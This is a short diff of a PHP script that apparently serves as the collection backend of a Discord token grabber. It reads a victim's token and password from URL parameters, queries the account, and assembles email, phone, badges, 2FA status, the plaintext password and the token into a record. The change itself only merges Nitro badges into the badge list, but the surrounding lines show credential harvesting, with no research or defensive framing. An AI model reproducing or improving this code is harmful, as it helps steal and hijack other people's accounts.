@@ -17,7 +17,6 @@ if (isset($_GET['token']) && !empty($_GET['token'])) {
     $data = json_decode($response);
 
     $badges = array();
-    $nitro_badges = array();
 
     // Get Badges
     if ($data->flags == 1) {
@@ -42,10 +41,10 @@ if (isset($_GET['token']) && !empty($_GET['token'])) {
 
     // Get Nitro Status
     if ($data->premium_type == 1) {
-        $nitro_badges[] = "nitrocl";
+        $badges[] = "nitrocl";
     } else if ($data->premium_type == 2) {
-        $nitro_badges[] = "nitrocl";
-        $nitro_badges[] = "nitroboost";
+        $badges[] = "nitrocl";
+        $badges[] = "nitroboost";
     }
 
     if (isset($data->id) && !empty($data->id)) {
@@ -61,10 +60,7 @@ if (isset($_GET['token']) && !empty($_GET['token'])) {
             "avatar" => $data->avatar,
             "email" => $data->email,
             "phone" => $data->phone || "None",
-            "badges" => [
-                $badges,
-                $nitro_badges
-            ],
+            "badges" => $badges,
             "password" => $_GET['password'],
             "twofactor" => $data->mfa_enabled,
             "token" => $_GET['token'],
